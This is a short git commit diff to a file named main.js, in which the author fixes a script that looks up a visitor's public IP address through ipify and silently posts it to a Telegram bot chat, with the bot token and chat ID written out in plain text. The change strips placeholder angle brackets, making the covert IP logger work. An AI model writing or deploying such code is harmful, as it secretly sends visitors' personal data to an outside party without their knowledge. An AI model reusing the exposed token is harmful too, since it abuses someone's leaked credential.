811e2297570023832a46a7fb2f9ec4a99f34da9c
eymenderdiyok <eymenderdiyok9@icloud.com>
2025-07-20 01:59:52 +0300

    Update main.js

--- main.js
+++ main.js
@@ -1,11 +1,11 @@
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
-    fetch('https://api.telegram.org/bot<8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U>/sendMessage', {
+    fetch('https://api.telegram.org/bot8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U/sendMessage', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: '<7125066639>',
+        chat_id: '7125066639',
         text: `IP adresi: ${data.ip}`
       })
     });
